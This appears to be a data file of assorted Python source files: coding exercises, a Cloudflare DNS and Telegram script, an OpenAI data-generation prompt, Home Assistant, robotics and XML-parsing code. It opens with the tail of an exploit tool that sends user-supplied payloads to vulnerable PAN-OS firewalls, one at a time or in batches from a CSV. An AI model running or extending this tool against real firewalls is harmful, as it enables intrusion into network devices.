\").strip().lower()\n    \n    if choice == 'd':\n        while True:\n            target_ip = input(\"Enter the IP address of the vulnerable PAN-OS firewall (or 'q' to quit): \")\n            if target_ip.lower() == 'q':\n                break\n            root_ca = input(\"Enter the path to the root CA certificate (leave blank to disable certificate verification): \").strip()\n            payload = input(\"Enter the payload to execute: \")\n            exploit_firewall(target_ip, payload, root_ca)\n    elif choice == 'c':\n        csv_file = input(\"Enter the path to the CSV file: \")\n\n        with open(csv_file, newline='') as csvfile:\n            reader = csv.reader(csvfile)\n            next(reader)  # Skip header row if present\n            for row in reader:\n                target_ip, payload, root_ca = row\n                exploit_firewall(target_ip, payload, root_ca)\n    else:\n        print(\"Invalid choice. Please enter 'D' for entering values directly or 'C' for using a CSV file.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "# 1. Write a Python Program to Find the Factorial of a Number?\r\n# num = int(input(\"enter the number\"))\r\n# fac = 1\r\n# for i in range(1,num+1):\r\n#     fac = fac*i\r\n# print(fac)\r\n\r\n# 2. Write a Python Program to Display the multiplication Table?\r\n# num = int(input(\"enter the number for which multiplication table has to be displayed\"))\r\n# for i in range(1,11):\r\n#     print(f'{num}*{i} = {num*i}')\r\n\r\n# 3. Write a Python Program to Print the Fibonacci sequence?\r\n\r\n# a = int(input(\"enter the first number\"))\r\n# b = int(input(\"enter th second number\"))\r\n# l = [a,b]\r\n# seq = int(input(\"enter how many times you want to iterate the series\"))\r\n# for i in range(1,seq):\r\n#     c = l[-1]+l[-2]\r\n#     l.append(c)\r\n#     a = l[-2]\r\n#     b = l[-1]\r\n# print(l)\r\n\r\n# 4. Write a Python Program to Check Armstrong Number?\r\n# num = int(input(\"enter the number\"))\r\n# pow = len(str(num))\r\n# sum = 0\r\n# for i in range(0,pow):\r\n#     sum = sum + int(str(num)[i])**pow\r\n# if sum == num:\r\n#     print(\"entered number is an armstrong number\")\r\n# else:\r\n#     print(\"number is not an armstrong number\")\r\n\r\n# 5. Write a Python Program to Find Armstrong Number in an Interval?\r\n# interval = int(input(\"enter the number\"))\r\n# l = []\r\n# for i in range(0,interval+1):\r\n#     pow = len(str(i))\r\n#     sum = 0\r\n#     for j in range(0,pow):\r\n#         sum = sum + int(str(i)[j])**pow\r\n#     if sum==i:\r\n#         l.append(i)\r\n#\r\n# print(l)\r\n\r\n# 6. Write a Python Program to Find the Sum of Natural Numbers?\r\nn=int(input(\"enter for how much numbers you want to know the sum\"))\r\nsum = (n*(n+1))/2\r\nprint(f\"the sum of first {n} is {sum}\")\r\n\r\n\r\n",
    "import requests\nimport json\n# import schedule\n# import time\n\nbot_token = '\u4f60\u7684tg\u673a\u5668\u4ebatoken'\nchat_id = '\u9700\u8981\u63a8\u9001\u901a\u77e5\u7684\u7fa4\u6216\u4e2a\u4ebaID'\ncf_account = '\u4f60\u7684cloudflare\u8d26\u53f7'\napi_key = '\u4f60\u7684cloudflare\u8d26\u53f7\u7684api\u5bc6\u94a5'\nzone_id = 'cloudflare\u4e2d\u9700\u8981\u4f7f\u7528\u811a\u672c\u7684\u57df\u540dzone_id'\nsub_domain = '\u9700\u8981\u4f7f\u7528\u811a\u672c\u7684\u57df\u540d\u6216\u5b50\u57df\u540d\uff0c\u4f8b\u5982 a.example.com'\n\n\ndef send_message(text):\n    message_data = {\n        'chat_id': chat_id,\n        'text': text,\n        'parse_mode': 'MarkdownV2'\n    }\n    print(text)\n    try:\n        res = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=message_data)\n        if res.status_code == 200:\n            print(\"\u53d1\u9001\u6210\u529f\")\n            res.close()\n        else:\n            print(\"\u53d1\u9001\u5931\u8d25\")\n    except Exception as e:\n        print(e)\n\n\ndef update_dns_ip(new_ip):\n    headers = {\n        \"X-Auth-Email\": cf_account,\n        \"X-Auth-Key\": api_key,\n    }\n\n    index_url = f\"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records?name={sub_domain}\"\n    response = requests.get(index_url, headers=headers)\n    record_id = response.json()[\"result\"][0][\"id\"]\n\n    update_url = f\"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records/{record_id}\"\n    payload = {\n        \"content\": new_ip\n    }\n    headers[\"Content-Type\"] = \"application/json\"\n    update_response = requests.patch(update_url, headers=headers, data=json.dumps(payload))\n    print(update_response.json())\n    if response.status_code == 200:\n        data = response.json()\n        if data[\"success\"]:\n            raw_msg = \"\u2705\u4f18\u9009IP\u66f4\u65b0\u6210\u529f\uff01\"\n            send_message(raw_msg)\n        else:\n            print(update_response.json())\n            raw_msg = f\"\u274c\u4f18\u9009IP\u66f4\u65b0\u5931\u8d25\uff0c\u72b6\u6001\u7801\uff1a{update_response.status_code}\"\n            send_message(raw_msg)\n    else:\n        raw_msg = f\"\u274c\u4f18\u9009IP\u66f4\u65b0\u5931\u8d25\uff0c\u72b6\u6001\u7801\uff1a{update_response.status_code}\"\n        send_message(raw_msg)\n\n\ndef get_current_ip():\n    api1 = \"https://monitor.gacjie.cn/api/client/get_ip_address\"\n    api2 = \"https://cfnode.eu.org/api/ajax/get_opt_v4\"\n\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/108.0.0.0 '\n                      'Safari/537.36'}\n\n    response = requests.get(url=api1, headers=headers, timeout=15).json()\n    try:\n        if response['msg'] == \"\u67e5\u8be2\u6210\u529f\":\n            ip_list = response['info']['CM']\n            ip_list1 = response['info']['CU']\n            ip_list2 = response['info']['CT']\n            lists = ip_list + ip_list1 + ip_list2\n            max_item = max(lists, key=lambda x: x['bandwidth'])\n            # \u63d0\u53d6\u5bf9\u5e94\u7684\u5b57\u6bb5\n            max_address = max_item['address']\n            max_bandwidth = max_item['bandwidth']\n            max_bandwidth = str(max_bandwidth) + \"MB\"\n            max_delay = max_item['delay']\n            max_colo = max_item['colo']\n            max_device_name = max_item['line_name']\n\n            text = f\"\u2705*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u6210\u529f*\\n*\u4ec5\u7f51\u9875\u52a0\u901f\uff0c\u4e0d\u53ef\u7528\u4e8e\u8282\u70b9*\\nCName\u57df\u540d\uff1a `{sub_domain}`\\n\u5f53\u524d\u6e90\uff1a`Default`\\n\u66f4\u65b0\u9891\u7387\uff1a`4H`\\n\\n\u6700\u4f18IP\uff1a`{max_address}`\\n\u901f\u5ea6\uff1a`{max_bandwidth}/S`\\n\u5ef6\u8fdf\uff1a`{max_delay} ms`\\n\u6570\u636e\u4e2d\u5fc3\uff1a`{max_colo}`\\n\u6d4b\u901f\u670d\u52a1\u5668\uff1a`{max_device_name}`\\n\\n\u5f00\u59cb\u5c1d\u8bd5\u5207\u6362DNS\u89e3\u6790\u2026\u2026\"\n            send_message(text)\n\n            update_dns_ip(max_address)\n\n        else:\n            res = requests.get(url=api2, headers=headers, timeout=15).json()\n            if res['msg'] == \"\u67e5\u8be2\u6210\u529f\":\n                ip_list = res['data']\n                max_item = max(ip_list, key=lambda x: x['bandwidth'])\n                # \u63d0\u53d6\u5bf9\u5e94\u7684\u5b57\u6bb5\n                max_address = max_item['address']\n                max_bandwidth = max_item['bandwidth']\n                max_delay = max_item['delay']\n                max_colo = max_item['colo']\n                max_device_name = max_item['device_name']\n\n                text = f\"\u2705*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u6210\u529f*\\n*\u4ec5\u7f51\u9875\u52a0\u901f\uff0c\u4e0d\u53ef\u7528\u4e8e\u8282\u70b9*\\nCName\u57df\u540d\uff1a `{sub_domain}`\\n\u5f53\u524d\u6e90\uff1a`Second`\\n\u66f4\u65b0\u9891\u7387\uff1a`4H`\\n\\n\u6700\u4f18IP\uff1a`{max_address}`\\n\u901f\u5ea6\uff1a`{max_bandwidth}/S`\\n\u5ef6\u8fdf\uff1a`{max_delay} ms`\\n\u6570\u636e\u4e2d\u5fc3\uff1a`{max_colo}`\\n\u6d4b\u901f\u670d\u52a1\u5668\uff1a`{max_device_name}`\\n\\n\u5f00\u59cb\u5c1d\u8bd5\u5207\u6362DNS\u89e3\u6790\u2026\u2026\"\n                send_message(text)\n\n                update_dns_ip(max_address)\n\n    except Exception as e:\n        notice = response['msg'] if response['msg'] else \"API\u51fa\u73b0\u95ee\u9898\uff0c\u8bf7\u68c0\u67e5\uff01\"\n        text = \"\u274c*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u5931\u8d25*\\n\\n\u6545\u969c\u539f\u56e0\uff1a\" + notice + str(e)\n        send_message(text)\n\n\n# def job():\n#     get_current_ip()\n#\n#\n# schedule.every(4).hours.do(job)\n#\n# while True:\n#     schedule.run_pending()\n#     time.sleep(1)\n\nif __name__ == '__main__':\n    get_current_ip()\n",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Fri Apr 19 20:19:48 2024\r\n\r\n@author: 10364\r\n\"\"\"\r\n\r\nimport openai            # pip install openai==0.28.1\r\n\r\nopenai.api_key = \"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\r\n\r\n# prompt\r\ncontent = \"Based on some studies the optimal temperature for strawberry plant growth is 15\u201326\u00b0C . During flowering stage, it\u2019s best to maintain a temperature range of 16-20\u00b0C. However, once the plants bear fruit, a range of 15-16\u00b0C is ideal for maturation. However, this temperature varies among different cultivars. Strawberry cultivars exhibit two primary categories based on their flowering patterns: seasonal flowering, commonly known as June-bearing, and perpetual flowering, also referred to as everbearing. In the case of June-bearing strawberries, flowering is triggered by the combination of short-day conditions and low temperatures in autumn. Following this initiation, the plant enters a dormant phase throughout the winter, culminating in a singular harvest season during the summer. On the other hand, everbearing strawberries possess the flexibility to initiate flowering under various photoperiods and within a moderate temperature range. This adaptability results in an extended harvest season, spanning from spring through to autumn.\"\r\n\r\nprint(\"content:  \" + content)\r\nprompt1 = \"Extract a virtual conversation about strawberry planting from the Knowledge, and hypothesize a famer is consulting a strawberry agronomist about relevant planting knowledge and information. \\n\"\r\nprompt2 = \"Use the following JSON format as output: \\n\"\r\nprompt3 = \"[\\n\"\r\nprompt4 = \"{instruction: \\\" If you are an agronomist, please answer the farmer questions based on the farmer's description.\\\",\\n\"\r\nprompt5 = \"input: farmer's description,\\n\"\r\nprompt6 = \"output: agronomist\u2019s response}\\n\"\r\nprompt7 = \"]\\n\"\r\nprompt8 = \"The extracted result should exclude words triggering OpenAI content management policy.\\n\"\r\nprompt9 = \"\\n\"\r\nprompt10 = \"Knowledge: {\" + content + \"}\"\r\n\r\nprompt_final = prompt1 + prompt2 + prompt3 + prompt4 + prompt5 + prompt6 + prompt7 + prompt8 + prompt9 + prompt10\r\n\r\ncompletion = openai.ChatCompletion.create(\r\n    model=\"gpt-3.5-turbo\",\r\n    messages=[\r\n        {\"role\": \"user\", \"content\": prompt_final}\r\n  ]\r\n)\r\n\r\nprint(\"----------------------------------------------\")\r\nprint(\"Result: \\n\", completion.choices[0].message.content)",
    "\"\"\"UDP Listener for Atomberg integration.\"\"\"\n\nimport asyncio\nimport json\nfrom logging import getLogger\n\nfrom homeassistant.core import HomeAssistant\n\n_LOGGER = getLogger(__name__)\n\n\nclass UDPListener(asyncio.DatagramProtocol):\n    \"\"\"UDP Listener.\"\"\"\n\n    def __init__(self, hass: HomeAssistant) -> None:\n        \"\"\"Init UDP Listener.\"\"\"\n        self.hass = hass\n        self.devices = {}\n        self._listener = None\n        self._callback = None\n\n    def datagram_received(self, data, addr):\n        \"\"\"Decode data when broadcast received.\"\"\"\n        message = data.decode(\"utf-8\")\n        _LOGGER.debug(\"Message received: %s\", message)\n\n        # Try to hexdecode the message\n        try:\n            msg_data = bytes.fromhex(message)\n            msg_data = json.loads(msg_data)\n        except ValueError:\n            msg_data = {\"device_id\": message.split(\"_\")[0]}\n\n        if self._callback:\n            self._callback(msg_data)\n\n    def set_callback(self, __func):\n        \"\"\"Get callback when a message is received.\"\"\"\n        self._callback = __func\n\n    async def start(self):\n        \"\"\"Start listening.\"\"\"\n        loop = asyncio.get_running_loop()\n        self._listener = await loop.create_datagram_endpoint(\n            lambda: self, local_addr=(\"0.0.0.0\", 5625), reuse_port=True\n        )\n        _LOGGER.debug(\"Listening to broadcasts on UDP port 5625\")\n\n    def close(self):\n        \"\"\"Close listener.\"\"\"\n        if self._listener:\n            self._callback = None\n            self._listener[0].close()\n            _LOGGER.debug(\"Closed UDP listener on port 5625\")\n",
    "from __future__ import annotations\n\nimport sys\nfrom abc import ABCMeta, abstractmethod\nfrom socket import AF_INET, SOCK_STREAM, AddressFamily, SocketKind\nfrom typing import TYPE_CHECKING, Generic, TypeVar\n\nif sys.version_info >= (3, 12):\n    from typing import Buffer\nelse:\n    from typing_extensions import Buffer\n\nif TYPE_CHECKING:\n    from .socket import SocketType\n\nT = TypeVar(\"T\")\nT_resource = TypeVar(\"T_resource\")\nSendType = TypeVar(\"SendType\")\nReceiveType = TypeVar(\"ReceiveType\")\n\n\nclass AsyncResource(metaclass=ABCMeta):\n    @abstractmethod\n    async def aclose(self) -> None: ...\n\n\nclass SendStream(AsyncResource):\n    @abstractmethod\n    async def send_all(self, data: Buffer) -> None: ...\n\n    @abstractmethod\n    async def wait_send_all_might_not_block(self) -> None: ...\n\n\nclass ReceiveStream(AsyncResource):\n    @abstractmethod\n    async def receive_some(self, max_bytes: int | None = None) -> bytes | bytearray: ...\n\n\nclass Stream(SendStream, ReceiveStream):\n    pass\n\n\nclass HalfCloseableStream(Stream):\n    @abstractmethod\n    async def send_eof(self) -> None: ...\n\n\nclass Listener(AsyncResource, Generic[T_resource]):\n    @abstractmethod\n    async def accept(self) -> T_resource: ...\n\n\nclass SendChannel(AsyncResource, Generic[SendType]):\n    async def send(self, value: SendType) -> None:\n        pass\n\n\nclass ReceiveChannel(AsyncResource, Generic[ReceiveType]):\n    async def receive(self) -> ReceiveType:\n        pass\n\n\nclass Channel(SendChannel[T], ReceiveChannel[T]):\n    pass\n\n\nclass HostnameResolver(metaclass=ABCMeta):\n    @abstractmethod\n    async def getaddrinfo(\n        self,\n        host: bytes | None,\n        port: bytes | str | int | None,\n        family: int = 0,\n        type: int = 0,\n        proto: int = 0,\n        flags: int = 0,\n    ) -> list[\n        tuple[\n            AddressFamily,\n            SocketKind,\n            int,\n            str,\n            tuple[str, int] | tuple[str, int, int, int],\n        ]\n    ]: ...\n\n\nclass SocketFactory(metaclass=ABCMeta):\n    @abstractmethod\n    def socket(\n        self,\n        family: AddressFamily = AF_INET,\n        type: SocketKind = SOCK_STREAM,\n        proto: int = 0,\n    ) -> SocketType: ...\n",
    "from labelle.lib.render_engines.barcode import BarcodeRenderEngine\nfrom labelle.lib.render_engines.barcode_with_text import BarcodeWithTextRenderEngine\nfrom labelle.lib.render_engines.empty import EmptyRenderEngine\nfrom labelle.lib.render_engines.horizontally_combined import (\n    HorizontallyCombinedRenderEngine,\n)\nfrom labelle.lib.render_engines.margins import MarginsRenderEngine\nfrom labelle.lib.render_engines.picture import NoPictureFilePath, PictureRenderEngine\nfrom labelle.lib.render_engines.print_payload import PrintPayloadRenderEngine\nfrom labelle.lib.render_engines.print_preview import PrintPreviewRenderEngine\nfrom labelle.lib.render_engines.qr import NoContentError, QrRenderEngine\nfrom labelle.lib.render_engines.render_context import RenderContext\nfrom labelle.lib.render_engines.render_engine import RenderEngine\nfrom labelle.lib.render_engines.test_pattern import TestPatternRenderEngine\nfrom labelle.lib.render_engines.text import TextRenderEngine\n\n__all__ = [\n    BarcodeRenderEngine,\n    BarcodeWithTextRenderEngine,\n    EmptyRenderEngine,\n    HorizontallyCombinedRenderEngine,\n    MarginsRenderEngine,\n    NoContentError,\n    NoPictureFilePath,\n    PictureRenderEngine,\n    PrintPayloadRenderEngine,\n    PrintPreviewRenderEngine,\n    QrRenderEngine,\n    RenderContext,\n    RenderEngine,\n    TestPatternRenderEngine,\n    TextRenderEngine,\n]\n",
    "# A script to estimate human pose and using PD controller help the turtle bot follow the human\n## MANDRED TECH - FUTURE BEYOND OUR STAR\n\n#! /usr/bin/env python3\n\nimport rclpy\nfrom rclpy.node import Node \nfrom sensor_msgs.msg import Image\nfrom cv_bridge import CvBridge\nimport cv2 \nimport numpy as np\nfrom geometry_msgs.msg import Twist\nfrom pose_estimation_movenet_tflite import get_pose\nimport math\n    \nclass Human_Follower(Node): # Node containing a publisher and subscriber\n    def __init__(self):\n        super().__init__('human_following_turtlebot_MANDRED_TECH')\n\n        topic_name= '/camera/image_raw'\n        self.cmd_vel_publisher=self.create_publisher(Twist,\"/cmd_vel\",10)\n        self.get_logger().info(\"Control Script Started\")\n\n        self.subscription = self.create_subscription(Image, topic_name, self.img_callback, 10)\n        self.subscription \n        self.br = CvBridge()\n\n        self.WIDTH=800\n        self.HEIGHT=600\n        self.controlX=400\n        self.controlY=210\n\n        self.kpl=0.001 # P control for linear velocity\n        self.kdl=0.01 # D control for linear velocity\n        self.kpr=0.00001 # P control for rotational velocity\n        self.kdr=0.001 # D control for rotational velocity\n\n\n    def img_callback(self, data):\n        self.get_logger().info('Receiving video frame')\n        current_frame = self.br.imgmsg_to_cv2(data)\n        current_frame=cv2.resize(current_frame,(self.WIDTH,self.HEIGHT))\n        frame,x_cord,y_cord=get_pose(current_frame)\n        if(len(x_cord)>0):\n            X=sum(x_cord)//len(x_cord)\n            Y=sum(y_cord)//len(y_cord)\n            cv2.circle(frame, (int(X), int(Y)), 10, (255,255,255), -1) \n            print(X,Y)\n\n            # Calculating linear speed \n            P=euclid_distance(X,Y,self.controlX,self.controlY) * self.kpl\n            D=(self.controlY-Y) * self.kdl * -1\n            linea=P+D\n\n            # Calculating angular speed\n            theta=angle_finder(X,Y,self.controlX,self.controlY,self.controlX,self.controlY,self.WIDTH,self.controlY)\n            if theta>=180:\n                P_R=(270-theta) * self.kpr\n            else:\n                P_R=(theta-90) * self.kpr\n            D_R=(self.controlX-X) * self.kdr\n            rot=D_R + P_R\n            \n            print(\"Linear Speed Pred\",linea)\n            print(\"Angular Speed Pred\",rot)\n            self.publish_control(linea,0.0,0.0,0.0,0.0,rot)\n            \n        else:\n            self.publish_control(0.0,0.0,0.0,0.0,0.0,0.0)\n\n        # cv2.line(frame,(0,self.controlY),(self.WIDTH,self.controlY),(0,0,255),2)\n        # cv2.line(frame,(self.controlX,0),(self.controlX,self.HEIGHT),(0,0,255),2)\n        cv2.imshow(\"camera\", frame)\n        cv2.waitKey(1)\n    \n    def publish_control(self,lx,ly,lz,ax,ay,az): # Publisher function to publish vel to turtlebot vel topic\n        cmd=Twist()\n        cmd.linear.x=lx\n        cmd.linear.y=ly\n        cmd.linear.z=lz\n        cmd.angular.x=ax\n        cmd.angular.y=ay\n        cmd.angular.z=az\n        self.cmd_vel_publisher.publish(cmd)\n\ndef euclid_distance(x1,y1,x2,y2): # Function to calculate the euclidean distance between 2 points\n    dist=math.sqrt(((x2-x1)**2)+((y2-y1)**2))\n    return dist\n\ndef angle_finder(x1,y1,x2,y2,x3,y3,x4,y4): # Function to calculate the angle between two lines\n    if (x2-x1)!=0 and (x3-x3)!=0:\n        m1=(y2-y1)/(x2-x1)\n        m2=(y4-y3)/(x4-x3)\n        theta=math.atan2(math.abs(m2-m1)/(1+(m1*m2)))\n        return theta\n    return 0\n\n\ndef main(args=None):\n    rclpy.init(args=args)\n    human_follower = Human_Follower()\n    rclpy.spin(human_follower)\n    human_follower.destroy_node()\n    rclpy.shutdown()\n\n  \nif __name__ == '__main__':\n  main()",
    "import os,time,random\nimport xml.etree.ElementTree as ET\nimport pandas as pd\nimport glob\nimport csv\n\nimport multiprocessing as mp\nimport concurrent.futures\nfrom tqdm import tqdm\nfrom joblib import Parallel, delayed\n\ndef flatten(matrix):\n    return [item for i in tqdm(matrix) for item in i]\n\ndef perData_process(xml_file,ns):\n    tree = ET.parse(xml_file)\n    root = tree.getroot()\n    perDataProcess = []\n\n    for actSummary in root.findall('act:activities-summary',ns):\n        for edu in actSummary.findall('act:educations',ns):\n            for eduAffiliationGroup in edu.findall('act:affiliation-group',ns):\n                for eduSummary in eduAffiliationGroup.findall('edu:education-summary',ns):\n                    eduStartDate = 0\n                    eduOrgName = eduOrgCity = eduOrgCountry = eduOrgRegion = None\n\n                    for eduStartDateElement in eduSummary.findall('com:start-date',ns):\n                        for eduStartDateYearElement in eduStartDateElement.findall('com:year',ns):\n                            eduStartDate += 10000 * int(eduStartDateYearElement.text)\n                        for eduStartDateMonthElement in eduStartDateElement.findall('com:month',ns):\n                            eduStartDate += 100 * int(eduStartDateMonthElement.text)\n                        for eduStartDateDayElement in eduStartDateElement.findall('com:day',ns):\n                            eduStartDate += int(eduStartDateDayElement.text)\n\n                    for eduOrg in eduSummary.findall('com:organization',ns):\n                        eduOrgName = eduOrg.find('com:name',ns).text\n\n                        for eduAddress in eduOrg.findall('com:address',ns):\n                            eduOrgCity = eduAddress.find('com:city',ns).text\n                            eduOrgCountry = eduAddress.find('com:country',ns).text\n\n                            for eduOrgRegionElement in eduAddress.findall('com:region',ns):\n                                eduOrgRegion = eduOrgRegionElement.text\n\n                    if eduStartDate != 0 and eduOrgName is not None:\n                        perDataProcess.append({'StartDate': eduStartDate,\n                            'OrgName': eduOrgName, 'OrgCity': eduOrgCity, 'OrgRegion': eduOrgRegion, 'OrgCountry': eduOrgCountry})\n\n        for emp in actSummary.findall('act:employments',ns):\n            for empAffiliationGroup in emp.findall('act:affiliation-group',ns):\n                for empSummary in empAffiliationGroup.findall('emp:employment-summary',ns):\n                    empStartDate = 0\n                    empOrgName = empOrgCity = empOrgRegion = empOrgCountry = None\n\n                    for empStartDateElement in empSummary.findall('com:start-date',ns):\n                        for empStartDateYearElement in empStartDateElement.findall('com:year',ns):\n                            empStartDate += 10000 * int(empStartDateYearElement.text)\n                        for empStartDateMonthElement in empStartDateElement.findall('com:month',ns):\n                            empStartDate += 100 * int(empStartDateMonthElement.text)\n                        for empStartDateDayElement in empStartDateElement.findall('com:day',ns):\n                            empStartDate += int(empStartDateDayElement.text)\n\n                    for empOrg in empSummary.findall('com:organization',ns):\n                        empOrgName = empOrg.find('com:name',ns).text\n\n                        for empAddress in empOrg.findall('com:address',ns):\n                            empOrgCity = empAddress.find('com:city',ns).text\n                            empOrgCountry = empAddress.find('com:country',ns).text\n\n                            for empOrgRegionElement in empAddress.findall('com:region',ns):\n                                empOrgRegion = empOrgRegionElement.text\n\n                    if empStartDate != 0 and empOrgName is not None:\n                        perDataProcess.append({'StartDate': empStartDate,\n                            'OrgName': empOrgName, 'OrgCity': empOrgCity, 'OrgRegion': empOrgRegion, 'OrgCountry': empOrgCountry})\n\n    return perDataProcess\n\ndef perData_proc_batch(batch,ns):\n  return [perData_process(xml_file,ns)\n    for xml_file in tqdm(batch)]\n\ndef perData_batch_file(array,n_workers):\n  file_len = len(array)\n  batch_size = round(file_len / n_workers)\n  batches = [array[ix : ix + batch_size]\n    for ix in tqdm(range(0,file_len,batch_size))]\n  return batches\n\ndef perData_sortDate(x):\n    return x['StartDate']\n\ndef dataFlow_process(perDataElement):\n    perDataCouName = []\n    dataFlowProcess = []\n    \n    lenPerDataElement = len(perDataElement)\n    for x in tqdm(range(lenPerDataElement)):\n        perDataElementX = perDataElement[x]\n\n        lenPerDataElementX = len(perDataElement[x])\n        for y in range(1,lenPerDataElementX):\n            ori = perDataElementX[y-1]\n            des = perDataElementX[y]\n    \n            dataFlowOrigin = ori['OrgCountry']\n            dataFlowDestination = des['OrgCountry']\n ",
    "# -*- coding: utf-8 -*-\n# Generated by the protocol buffer compiler.  DO NOT EDIT!\n# source: chrome_device_policy.proto\n\"\"\"Generated protocol buffer code.\"\"\"\nfrom google.protobuf.internal import builder as _builder\nfrom google.protobuf import descriptor as _descriptor\nfrom google.protobuf import descriptor_pool as _descriptor_pool\nfrom google.protobuf import symbol_database as _symbol_database\n# @@protoc_insertion_point(imports)\n\n_sym_db = _symbol_database.Default()\n\n\nfrom . import policy_common_definitions_pb2 as policy__common__definitions__pb2\n\n\nDESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\\n\\x1a\\x63hrome_device_policy.proto\\x12\\x15\\x65nterprise_management\\x1a\\x1fpolicy_common_definitions.proto\\\"B\\n\\x1c\\x44\\x65vicePolicyRefreshRateProto\\x12\\\"\\n\\x1a\\x64\\x65vice_policy_refresh_rate\\x18\\x01 \\x01(\\x03\\\",\\n\\x12UserWhitelistProto\\x12\\x16\\n\\x0euser_whitelist\\x18\\x01 \\x03(\\t\\\",\\n\\x12UserAllowlistProto\\x12\\x16\\n\\x0euser_allowlist\\x18\\x01 \\x03(\\t\\\"3\\n\\x12\\x41llowNewUsersProto\\x12\\x1d\\n\\x0f\\x61llow_new_users\\x18\\x01 \\x01(\\x08:\\x04true\\\"9\\n\\x15GuestModeEnabledProto\\x12 \\n\\x12guest_mode_enabled\\x18\\x01 \\x01(\\x08:\\x04true\\\";\\n\\x1aShowUserNamesOnSigninProto\\x12\\x1d\\n\\x0fshow_user_names\\x18\\x01 \\x01(\\x08:\\x04true\\\">\\n\\x17\\x44\\x61taRoamingEnabledProto\\x12#\\n\\x14\\x64\\x61ta_roaming_enabled\\x18\\x01 \\x01(\\x08:\\x05\\x66\\x61lse\\\"\\xb3\\x01\\n!OBSOLETE_DeviceProxySettingsProto\\x12\\x1f\\n\\x13OBSOLETE_proxy_mode\\x18\\x01 \\x01(\\tB\\x02\\x18\\x01\\x12!\\n\\x15OBSOLETE_proxy_server\\x18\\x02 \\x01(\\tB\\x02\\x18\\x01\\x12\\\"\\n\\x16OBSOLETE_proxy_pac_url\\x18\\x03 \\x01(\\tB\\x02\\x18\\x01\\x12&\\n\\x1aOBSOLETE_proxy_bypass_list\\x18\\x04 \\x01(\\tB\\x02\\x18\\x01\\\",\\n\\x12\\x43\\x61meraEnabledProto\\x12\\x16\\n\\x0e\\x63\\x61mera_enabled\\x18\\x01 \\x01(\\x08\\\".\\n\\x13MetricsEnabledProto\\x12\\x17\\n\\x0fmetrics_enabled\\x18\\x01 \\x01(\\x08\\\"j\\n\\x13ReleaseChannelProto\\x12\\x17\\n\\x0frelease_channel\\x18\\x01 \\x01(\\t\\x12!\\n\\x19release_channel_delegated\\x18\\x02 \\x01(\\x08\\x12\\x17\\n\\x0frelease_lts_tag\\x18\\x03 \\x01(\\t\\\"I\\n#DeviceOpenNetworkConfigurationProto\\x12\\\"\\n\\x1aopen_network_configuration\\x18\\x01 \\x01(\\t\\\"8\\n\\x14NetworkHostnameProto\\x12 \\n\\x18\\x64\\x65vice_hostname_template\\x18\\x01 \\x01(\\t\\\"?\\n%DeviceHindiInscriptLayoutEnabledProto\\x12\\x16\\n\\x07\\x65nabled\\x18\\x01 \\x01(\\x08:\\x05\\x66\\x61lse\\\"Q\\n\\x1dHostnameUserConfigurableProto\\x12\\x30\\n!device_hostname_user_configurable\\x18\\x01 \\x01(\\x08:\\x05\\x66\\x61lse\\\"\\x93\\x0e\\n\\x14\\x44\\x65viceReportingProto\\x12!\\n\\x13report_version_info\\x18\\x01 \\x01(\\x08:\\x04true\\x12#\\n\\x15report_activity_times\\x18\\x02 \\x01(\\x08:\\x04true\\x12\\x1e\\n\\x10report_boot_mode\\x18\\x03 \\x01(\\x08:\\x04true\\x12\\x1e\\n\\x0freport_location\\x18\\x04 \\x01(\\x08:\\x05\\x66\\x61lse\\x12+\\n\\x19report_network_interfaces\\x18\\x05 \\x01(\\x08:\\x04trueB\\x02\\x18\\x01\\x12\\x1a\\n\\x0creport_users\\x18\\x06 \\x01(\\x08:\\x04true\\x12(\\n\\x16report_hardware_status\\x18\\x07 \\x01(\\x08:\\x04trueB\\x02\\x18\\x01\\x12#\\n\\x15report_session_status\\x18\\x08 \\x01(\\x08:\\x04true\\x12&\\n\\x17report_os_update_status\\x18\\n \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\'\\n\\x18report_running_kiosk_app\\x18\\x0b \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\\"\\n\\x13report_power_status\\x18\\x0c \\x01(\\x08:\\x05\\x66\\x61lse\\x12$\\n\\x15report_storage_status\\x18\\r \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\\"\\n\\x13report_board_status\\x18\\x0e \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\x1e\\n\\x0freport_cpu_info\\x18\\x0f \\x01(\\x08:\\x05\\x66\\x61lse\\x12%\\n\\x16report_graphics_status\\x18\\x10 \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\'\\n\\x18report_crash_report_info\\x18\\x11 \\x01(\\x08:\\x05\\x66\\x61lse\\x12#\\n\\x14report_timezone_info\\x18\\x12 \\x01(\\x08:\\x05\\x66\\x61lse\\x12!\\n\\x12report_memory_info\\x18\\x13 \\x01(\\x08:\\x05\\x66\\x61lse\\x12$\\n\\x15report_backlight_info\\x18\\x14 \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\x1e\\n\\x0freport_app_info\\x18\\x15 \\x01(\\x08:\\x05\\x66\\x61lse\\x12$\\n\\x15report_bluetooth_info\\x18\\x16 \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\x1e\\n\\x0freport_fan_info\\x18\\x17 \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\x1e\\n\\x0freport_vpd_info\\x18\\x18 \\x01(\\x08:\\x05\\x66\\x61lse\\x12!\\n\\x12report_system_info\\x18\\x19 \\x01(\\x08:\\x05\\x66\\x61lse\\x12 \\n\\x11report_print_jobs\\x18\\x1a \\x01(\\x08:\\x05\\x66\\x61lse\\x12\\\"\\n\\x13report_login_logout\\x18\\x1b \\x01(\\x08:\\x05\\x66\\x61lse\\x12!\\n\\x13report_audio_status\\x18\\x1c \\x01(\\x08:\\x04true\\x12*\\n\\x1creport_network_configuration\\x18\\x1d 